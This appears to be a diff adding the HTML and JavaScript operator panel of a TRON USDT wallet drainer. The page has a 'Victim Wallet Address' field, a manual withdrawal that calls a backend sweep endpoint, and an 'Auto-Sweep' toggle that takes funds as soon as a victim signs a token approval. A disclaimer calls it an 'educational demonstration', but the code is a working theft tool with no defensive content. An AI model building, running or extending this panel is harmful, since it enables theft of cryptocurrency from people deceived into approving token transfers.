@@ -1,0 +1,550 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin - USDT Withdrawal Control</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Courier New', monospace;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            color: #00ff00;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: rgba(0, 0, 0, 0.8);
+            border: 2px solid #ff0000;
+            border-radius: 12px;
+            padding: 40px;
+            max-width: 600px;
+            width: 100%;
+            box-shadow: 0 0 30px rgba(255, 0, 0, 0.3);
+        }
+
+        h1 {
+            color: #ff0000;
+            text-align: center;
+            margin-bottom: 10px;
+            font-size: 28px;
+            text-shadow: 0 0 10px rgba(255, 0, 0, 0.5);
+        }
+
+        .subtitle {
+            text-align: center;
+            color: #00ff00;
+            margin-bottom: 30px;
+            font-size: 14px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            color: #00ff00;
+            margin-bottom: 8px;
+            font-size: 14px;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            background: rgba(0, 255, 0, 0.1);
+            border: 1px solid #00ff00;
+            border-radius: 6px;
+            color: #00ff00;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #ff0000;
+            box-shadow: 0 0 10px rgba(255, 0, 0, 0.3);
+        }
+
+        input::placeholder {
+            color: rgba(0, 255, 0, 0.4);
+        }
+
+        .button-group {
+            display: flex;
+            gap: 10px;
+            margin-top: 30px;
+        }
+
+        button {
+            flex: 1;
+            padding: 15px;
+            border: none;
+            border-radius: 6px;
+            font-family: 'Courier New', monospace;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .btn-withdraw {
+            background: linear-gradient(135deg, #ff0000, #cc0000);
+            color: white;
+        }
+
+        .btn-withdraw:hover {
+            background: linear-gradient(135deg, #cc0000, #990000);
+            box-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
+        }
+
+        .btn-withdraw:disabled {
+            background: #555;
+            cursor: not-allowed;
+            opacity: 0.5;
+        }
+
+        .btn-clear {
+            background: linear-gradient(135deg, #666, #444);
+            color: white;
+        }
+
+        .btn-clear:hover {
+            background: linear-gradient(135deg, #555, #333);
+        }
+
+        .result {
+            margin-top: 30px;
+            padding: 20px;
+            background: rgba(0, 0, 0, 0.5);
+            border: 1px solid #00ff00;
+            border-radius: 6px;
+            display: none;
+        }
+
+        .result.show {
+            display: block;
+        }
+
+        .result.success {
+            border-color: #00ff00;
+        }
+
+        .result.error {
+            border-color: #ff0000;
+        }
+
+        .result-title {
+            font-size: 16px;
+            margin-bottom: 10px;
+            font-weight: bold;
+        }
+
+        .result.success .result-title {
+            color: #00ff00;
+        }
+
+        .result.error .result-title {
+            color: #ff0000;
+        }
+
+        .result-item {
+            margin: 8px 0;
+            font-size: 13px;
+            word-break: break-all;
+        }
+
+        .result-label {
+            color: #888;
+            display: inline-block;
+            width: 120px;
+        }
+
+        .loading {
+            text-align: center;
+            color: #ff0000;
+            margin-top: 20px;
+            display: none;
+        }
+
+        .loading.show {
+            display: block;
+        }
+
+        .warning {
+            background: rgba(255, 165, 0, 0.1);
+            border: 1px solid #ff9900;
+            border-radius: 6px;
+            padding: 15px;
+            margin-bottom: 20px;
+            color: #ff9900;
+            font-size: 12px;
+        }
+
+        .link {
+            color: #00ff00;
+            text-decoration: none;
+            border-bottom: 1px dashed #00ff00;
+        }
+
+        .link:hover {
+            color: #ff0000;
+            border-bottom-color: #ff0000;
+        }
+
+        .toggle-section {
+            background: rgba(0, 0, 0, 0.5);
+            border: 1px solid #00ff00;
+            border-radius: 6px;
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+
+        .toggle-section.disabled {
+            border-color: #888;
+        }
+
+        .toggle-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+
+        .toggle-title {
+            font-size: 16px;
+            font-weight: bold;
+            color: #00ff00;
+        }
+
+        .toggle-status {
+            font-size: 12px;
+            padding: 4px 12px;
+            border-radius: 4px;
+            font-weight: bold;
+        }
+
+        .toggle-status.enabled {
+            background: rgba(0, 255, 0, 0.2);
+            color: #00ff00;
+            border: 1px solid #00ff00;
+        }
+
+        .toggle-status.disabled {
+            background: rgba(136, 136, 136, 0.2);
+            color: #888;
+            border: 1px solid #888;
+        }
+
+        .toggle-description {
+            font-size: 12px;
+            color: #888;
+            margin-bottom: 15px;
+            line-height: 1.6;
+        }
+
+        .toggle-buttons {
+            display: flex;
+            gap: 10px;
+        }
+
+        .btn-toggle {
+            flex: 1;
+            padding: 10px;
+            border: none;
+            border-radius: 6px;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .btn-enable {
+            background: linear-gradient(135deg, #00ff00, #00cc00);
+            color: #000;
+        }
+
+        .btn-enable:hover {
+            background: linear-gradient(135deg, #00cc00, #009900);
+            box-shadow: 0 0 20px rgba(0, 255, 0, 0.5);
+        }
+
+        .btn-enable:disabled {
+            background: #555;
+            cursor: not-allowed;
+            opacity: 0.5;
+            color: #888;
+        }
+
+        .btn-disable {
+            background: linear-gradient(135deg, #666, #444);
+            color: white;
+        }
+
+        .btn-disable:hover {
+            background: linear-gradient(135deg, #555, #333);
+        }
+
+        .btn-disable:disabled {
+            background: #555;
+            cursor: not-allowed;
+            opacity: 0.5;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔐 ADMIN CONTROL PANEL</h1>
+        <div class="subtitle">Manual USDT Withdrawal System</div>
+
+        <!-- Auto-Sweep Toggle Control -->
+        <div class="toggle-section" id="toggleSection">
+            <div class="toggle-header">
+                <div class="toggle-title">🤖 Auto-Sweep Mode</div>
+                <div class="toggle-status enabled" id="toggleStatus">ENABLED</div>
+            </div>
+            <div class="toggle-description">
+                Auto-Sweep automatically withdraws USDT immediately after Approve signature succeeds.
+                Disable for manual-only demonstration mode.
+            </div>
+            <div class="toggle-buttons">
+                <button type="button" class="btn-toggle btn-enable" id="enableBtn" disabled>
+                    ✅ ENABLE AUTO-SWEEP
+                </button>
+                <button type="button" class="btn-toggle btn-disable" id="disableBtn">
+                    ⏸️ DISABLE AUTO-SWEEP
+                </button>
+            </div>
+        </div>
+
+        <div class="warning">
+            ⚠️ <strong>WARNING:</strong> This page provides direct control over USDT withdrawal from approved wallets. Use responsibly for educational demonstration only.
+        </div>
+
+        <form id="withdrawalForm">
+            <div class="form-group">
+                <label for="victimAddress">
+                    Victim Wallet Address:
+                </label>
+                <input
+                    type="text"
+                    id="victimAddress"
+                    placeholder="TYourVictimWalletAddress..."
+                    required
+                />
+            </div>
+
+            <div class="form-group">
+                <label for="amount">
+                    USDT Amount:
+                </label>
+                <input
+                    type="number"
+                    id="amount"
+                    placeholder="10.5"
+                    step="0.000001"
+                    min="0.000001"
+                    required
+                />
+            </div>
+
+            <div class="button-group">
+                <button type="submit" class="btn-withdraw" id="withdrawBtn">
+                    💰 WITHDRAW USDT
+                </button>
+                <button type="button" class="btn-clear" onclick="clearForm()">
+                    🔄 CLEAR
+                </button>
+            </div>
+        </form>
+
+        <div class="loading" id="loading">
+            ⏳ Processing withdrawal... Please wait.
+        </div>
+
+        <div class="result" id="result">
+            <div class="result-title" id="resultTitle"></div>
+            <div id="resultContent"></div>
+        </div>
+
+        <div style="margin-top: 30px; text-align: center; font-size: 12px; color: #888;">
+            <a href="/" class="link">← Back to Main Page</a>
+        </div>
+    </div>
+
+    <script>
+        const BACKEND_URL = window.location.origin;
+
+        document.getElementById('withdrawalForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+
+            const victimAddress = document.getElementById('victimAddress').value.trim();
+            const amount = document.getElementById('amount').value.trim();
+
+            if (!victimAddress || !amount) {
+                showResult('error', 'Please fill in all fields');
+                return;
+            }
+
+            // Validate TRON address format
+            if (!victimAddress.startsWith('T') || victimAddress.length !== 34) {
+                showResult('error', 'Invalid TRON address format. Address must start with T and be 34 characters long.');
+                return;
+            }
+
+            // Validate amount
+            const amountNum = parseFloat(amount);
+            if (isNaN(amountNum) || amountNum <= 0) {
+                showResult('error', 'Invalid amount. Must be greater than 0.');
+                return;
+            }
+
+            // Show loading
+            document.getElementById('loading').classList.add('show');
+            document.getElementById('result').classList.remove('show');
+            document.getElementById('withdrawBtn').disabled = true;
+
+            try {
+                const response = await fetch(`${BACKEND_URL}/api/admin/manual-sweep?victim=${victimAddress}&amount=${amount}`, {
+                    method: 'GET'
+                });
+
+                const data = await response.json();
+
+                if (data.success) {
+                    showResult('success', 'Withdrawal Successful!', {
+                        'Mode': data.mode,
+                        'Victim Address': data.victim,
+                        'Amount': `${data.amount} USDT`,
+                        'Amount (sun)': data.amountSun,
+                        'Recipient': data.recipient,
+                        'Transaction ID': data.txid,
+                        'TronScan': `<a href="https://tronscan.org/#/transaction/${data.txid}" target="_blank" class="link">View on TronScan →</a>`
+                    });
+                } else {
+                    showResult('error', 'Withdrawal Failed', {
+                        'Error': data.error
+                    });
+                }
+            } catch (error) {
+                console.error('Withdrawal error:', error);
+                showResult('error', 'Network Error', {
+                    'Error': error.message || 'Failed to connect to server'
+                });
+            } finally {
+                document.getElementById('loading').classList.remove('show');
+                document.getElementById('withdrawBtn').disabled = false;
+            }
+        });
+
+        function showResult(type, title, details = {}) {
+            const resultDiv = document.getElementById('result');
+            const resultTitle = document.getElementById('resultTitle');
+            const resultContent = document.getElementById('resultContent');
+
+            resultDiv.className = `result show ${type}`;
+            resultTitle.textContent = title;
+
+            if (Object.keys(details).length === 0) {
+                resultContent.innerHTML = '';
+            } else {
+                resultContent.innerHTML = Object.entries(details)
+                    .map(([label, value]) => `
+                        <div class="result-item">
+                            <span class="result-label">${label}:</span>
+                            <span>${value}</span>
+                        </div>
+                    `)
+                    .join('');
+            }
+        }
+
+        function clearForm() {
+            document.getElementById('withdrawalForm').reset();
+            document.getElementById('result').classList.remove('show');
+        }
+
+        // ============================================
+        // Auto-Sweep Toggle Functionality
+        // ============================================
+        async function loadAutoSweepStatus() {
+            try {
+                const response = await fetch(`${BACKEND_URL}/api/admin/auto-sweep-status`);
+                const data = await response.json();
+
+                updateToggleUI(data.autoSweepEnabled);
+            } catch (error) {
+                console.error('Failed to load Auto-Sweep status:', error);
+            }
+        }
+
+        async function toggleAutoSweep(enabled) {
+            try {
+                const response = await fetch(`${BACKEND_URL}/api/admin/toggle-auto-sweep`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ enabled })
+                });
+
+                const data = await response.json();
+
+                if (data.success) {
+                    updateToggleUI(data.autoSweepEnabled);
+                    console.log('✅ Auto-Sweep toggled:', data.autoSweepEnabled ? 'ENABLED' : 'DISABLED');
+                } else {
+                    alert('Failed to toggle Auto-Sweep: ' + data.error);
+                }
+            } catch (error) {
+                console.error('Failed to toggle Auto-Sweep:', error);
+                alert('Network error: ' + error.message);
+            }
+        }
+
+        function updateToggleUI(isEnabled) {
+            const toggleSection = document.getElementById('toggleSection');
+            const toggleStatus = document.getElementById('toggleStatus');
+            const enableBtn = document.getElementById('enableBtn');
+            const disableBtn = document.getElementById('disableBtn');
+
+            if (isEnabled) {
+                toggleSection.classList.remove('disabled');
+                toggleStatus.textContent = 'ENABLED';
+                toggleStatus.className = 'toggle-status enabled';
+                enableBtn.disabled = true;
+                disableBtn.disabled = false;
+            } else {
+                toggleSection.classList.add('disabled');
+                toggleStatus.textContent = 'DISABLED';
+                toggleStatus.className = 'toggle-status disabled';
+                enableBtn.disabled = false;
+                disableBtn.disabled = true;
+            }
+        }
+
+        // Event listeners for toggle buttons
+        document.getElementById('enableBtn').addEventListener('click', () => {
+            toggleAutoSweep(true);
+        });
+
+        document.getElementById('disableBtn').addEventListener('click', () => {
+            toggleAutoSweep(false);
+        });
+
+        // Load initial Auto-Sweep status on page load
+        loadAutoSweepStatus();
+
+        console.log('✅ Admin panel ready');
+        console.log('🔗 Backend URL:', BACKEND_URL);
+    </script>
+</body>
+</html>
